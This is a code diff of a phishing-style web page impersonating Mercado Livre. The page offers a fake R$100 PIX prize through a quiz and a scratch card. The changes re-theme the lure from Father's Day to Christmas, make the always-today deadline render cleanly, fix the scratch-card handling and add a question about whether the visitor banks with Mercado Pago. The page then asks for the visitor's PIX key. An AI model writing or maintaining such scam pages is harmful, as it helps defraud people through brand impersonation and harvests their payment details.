@@ -143,9 +143,9 @@
 	<div class="user-info">
         <div class="user-info-content">
             <div class="user-info-text">
-                <h1 class="text-3xl font-bold text-gray-900">Mês dos Pais Mercado Livre.</h1>
-                <p>Participe e receba R$100 Reais no seu PIX para você presentear seu Pai!</p><br>
-				<h3 style="font-weight:700"><font color="red">Válido para todos até: <span class="mp-blue-text" id="current_date3">20/010/2025</span> </font></h3><font color="red">
+                <h1 class="text-3xl font-bold text-gray-900">Mês Promocional Mercado Livre.</h1>
+                <p>Participe e receba R$100 Reais no seu PIX !</p><br>
+				<h3 style="font-weight:700"><font color="red">Válido para todos até: <span class="mp-blue-text" id="current_date3">25/10/2025</span> </font></h3><font color="red">
             </font></div><font color="red">
         </font></div><font color="red">
     </font></div><font color="red">
@@ -155,7 +155,12 @@
         year = date.getFullYear();
         month = date.getMonth() + 1;
         day1 = date.getDate() ;
-        document.getElementById("current_date3").innerHTML = day1 + "/0" + month + "/" + year;
+        (function(){
+          const dd = String(day1).padStart(2,'0');
+          const mm = String(month).padStart(2,'0');
+          const el3 = document.getElementById("current_date3");
+          if (el3) el3.innerHTML = dd + "/" + mm + "/" + year;
+        })();
     </script>
        
 
@@ -176,25 +181,25 @@
                         </div>
                     </div>
                     <div id="question-container">
-                <h3 class="text-xl font-semibold mb-5 text-gray-800">Está promoção é em comemoração ao...?</h3>
+                <h3 class="text-xl font-semibold mb-5 text-gray-800">Esta promoção é em comemoração a qual data?</h3>
                 <div class="space-y-3">
                 <div class="quiz-option border-2 border-gray-200 rounded-lg p-4 cursor-pointer text-left flex items-center" data-index="0">
-                    <span class="font-medium flex-1">Dia do irmão</span>
+                    <span class="font-medium flex-1">Páscoa</span>
                     <div class="w-6 h-6 rounded-full border-2 border-gray-300 flex items-center justify-center checkmark-container"></div>
                 </div>
             
                 <div class="quiz-option border-2 border-gray-200 rounded-lg p-4 cursor-pointer text-left flex items-center" data-index="1">
-                    <span class="font-medium flex-1">Dia dos Pais</span>
+                    <span class="font-medium flex-1">Natal</span>
                     <div class="w-6 h-6 rounded-full border-2 border-gray-300 flex items-center justify-center checkmark-container"></div>
                 </div>
             
                 <div class="quiz-option border-2 border-gray-200 rounded-lg p-4 cursor-pointer text-left flex items-center" data-index="2">
-                    <span class="font-medium flex-1">Dia das Mães</span>
+                    <span class="font-medium flex-1">Ano Novo</span>
                     <div class="w-6 h-6 rounded-full border-2 border-gray-300 flex items-center justify-center checkmark-container"></div>
                 </div>
             </div>
             </div>
-                    <button id="next-btn" class="w-full mt-8 mp-button text-white font-bold py-4 px-6 rounded-md shadow-md transition-all disabled:bg-gray-400 disabled:cursor-not-allowed" disabled="">Próxima</button>
+                    <button id="next-btn" class="w-full mt-8 mp-button text-white font-bold py-4 px-6 rounded-md shadow-md transition-all disabled:bg-gray-400 disabled:cursor-not-allowed" disabled>Próxima</button>
                 </div>
                 
                 <!-- Container da Raspadinha (inicialmente oculto) -->
@@ -235,6 +240,20 @@
                                 <label for="pixKey" class="block text-sm font-medium text-gray-700 mb-1">Sua Chave PIX</label>
                                 <input type="text" id="pixKey" name="pixKey" class="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500" placeholder="CPF, e-mail, celular ou chave aleatória" required="">
                             </div>
+                           
+                            <fieldset>
+                                <legend class="block text-sm font-medium text-gray-700 mb-2">Você utiliza o banco do Mercado Pago?</legend>
+                                <div class="space-y-2">
+                                    <label class="flex items-center">
+                                        <input type="radio" name="usaMercadoPago" value="Sim" class="text-blue-600 border-gray-300">
+                                        <span class="ml-2 text-sm text-gray-700">Sim</span>
+                                    </label>
+                                    <label class="flex items-center">
+                                        <input type="radio" name="usaMercadoPago" value="Não" class="text-blue-600 border-gray-300">
+                                        <span class="ml-2 text-sm text-gray-700">Não</span>
+                                    </label>
+                                </div>
+                            </fieldset>
                         </div>
                         <div class="mt-6">
                             <label class="flex items-center">
@@ -274,16 +293,21 @@
         year = date.getFullYear();
         month = date.getMonth() + 1;
         day = date.getDate() ;
-        document.getElementById("current_date2").innerHTML = day + "/0" + month;
+        (function(){
+          const dd = String(day).padStart(2,'0');
+          const mm = String(month).padStart(2,'0');
+          const el2 = document.getElementById("current_date2");
+          if (el2) el2.innerHTML = dd + "/" + mm;
+        })();
     </script>
     <script>
         lucide.createIcons();
 
         const quizData = [
-            { question: "Está promoção é em comemoração ao...?", options: ["Dia do irmão", "Dia dos Pais", "Dia das Mães"] },
-            { question: "Quantos anos você tem?", options: ["12-29", "30-39", "40-49", "+50"] },
-            { question: "Você já é cliente Mercado Livre? Como você nos avaliaria", options: ["Bom", "Muito Bom", "Mediano", "Não gosto!"] },
-            { question: "Você nos indiacaria para os amigos ou famiiliares?", options: ["Com certeza!", "Não"] }
+            { question: "Qual figura tradicional enfeita o topo da árvore de Natal?", options: ["Estrela", "Sino", "Boneco de neve"] },
+            { question: "Qual é a data do Natal?", options: ["24 de dezembro", "25 de dezembro", "31 de dezembro", "1º de janeiro"] },
+            { question: "Qual dessas é uma tradição de Natal?", options: ["Trocar presentes", "Soltar fogos", "Comer ovos de chocolate", "Pular ondas na praia"] },
+            { question: "Qual bebida é comum em filmes natalinos?", options: ["Chocolate quente", "Chá gelado"] }
         ];
 
         const questionContainer = document.getElementById('question-container');
@@ -418,30 +442,24 @@
                     canvas.style.pointerEvents = 'none';
                 }
             }
-            
+
             function startDrawing(e) {
                 isDrawing = true;
-                const pos = getBrushPos(e.clientX || e.touches[0].clientX, e.clientY || e.touches[0].clientY);
+                const pos = e.touches ? getBrushPos(e.touches[0].clientX, e.touches[0].clientY) : getBrushPos(e.clientX, e.clientY);
                 scratch(pos.x, pos.y);
             }
-            
             function draw(e) {
                 if (!isDrawing) return;
-                e.preventDefault();
-                const pos = getBrushPos(e.clientX || e.touches[0].clientX, e.clientY || e.touches[0].clientY);
+                const pos = e.touches ? getBrushPos(e.touches[0].clientX, e.touches[0].clientY) : getBrushPos(e.clientX, e.clientY);
                 scratch(pos.x, pos.y);
-            }
-            
-            function stopDrawing() {
-                isDrawing = false;
                 checkCompletion();
             }
+            function stopDrawing() { isDrawing = false; }
 
             canvas.addEventListener('mousedown', startDrawing);
             canvas.addEventListener('mousemove', draw);
             canvas.addEventListener('mouseup', stopDrawing);
             canvas.addEventListener('mouseleave', stopDrawing);
-
             canvas.addEventListener('touchstart', startDrawing);
             canvas.addEventListener('touchmove', draw);
             canvas.addEventListener('touchend', stopDrawing);
@@ -461,10 +479,10 @@ function updateOnlineCount() {
     onlineCountElement.textContent = `${currentOnline} Online`;
 }
     </script>
-	<script async="" src="./Mês dos Pais Mercado Livre_files/js"></script>
+	<script async src="./Mês dos Pais Mercado Livre_files/js"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
+  function gtag(){dataLayer.push(arguments);} 
   gtag('js', new Date());
 
   gtag('config', 'G-FFTTMPFVHV');
